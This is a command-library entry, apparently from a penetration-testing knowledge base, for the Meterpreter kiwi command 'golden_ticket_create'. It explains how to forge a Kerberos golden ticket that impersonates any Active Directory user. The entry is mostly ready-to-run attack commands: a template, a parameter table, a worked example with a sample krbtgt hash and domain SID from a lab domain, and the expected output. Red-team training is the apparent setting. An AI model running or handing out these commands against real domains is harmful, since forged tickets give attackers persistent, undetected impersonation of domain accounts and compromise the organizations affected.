---
id: 82b1e72a-21d2-4e57-8f27-50a2d507b8eb
name: golden-ticket-create
type: command
executor: meterpreter
data: >-
  golden_ticket_create -d $_DOMAIN -k $_KRBGTG_NT_HASH -s $_DOMAIN_SID -u
  $_TARGET_USER -t $_TICKET_FILE
output: null
created_at: '2023-04-06T03:56:04.748900+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - golden-ticket
verified: true
validated: true
---

# golden-ticket-create

## Command

```meterpreter
golden_ticket_create -d $_DOMAIN -k $_KRBGTG_NT_HASH -s $_DOMAIN_SID -u $_TARGET_USER -t $_TICKET_FILE
```

## Description

Forges a Golden Kerberos TGT using kiwi, allowing impersonation of any domain user with persistent access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d $_DOMAIN | Domain name (e.g., pentestlab.local) | Yes |
| -k $_KRBGTG_NT_HASH | NT hash of krbtgt (32 hex chars) | Yes |
| -s $_DOMAIN_SID | Domain SID without RID (e.g., S-1-5-21-...) | Yes |
| -u $_TARGET_USER | Target user for impersonation | Yes |
| -t $_TICKET_FILE | Path to save the ticket file | Yes |

## Examples

### Basic Usage

```meterpreter
golden_ticket_create -d example.com -k 32hexhash -s S-1-5-21-... -u admin -t /tmp/golden.tgt
```

### Specific Example

```meterpreter
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
```

## Expected Output

Golden ticket for user 'pentestlabuser' in domain 'pentestlab.local' saved to '/root/Downloads/pentestlabuser.tck'

## Related

- [[procedures/pass-the-golden-ticket-attack-using-meterpreter]]
- [[commands/kerberos-ticket-use]]
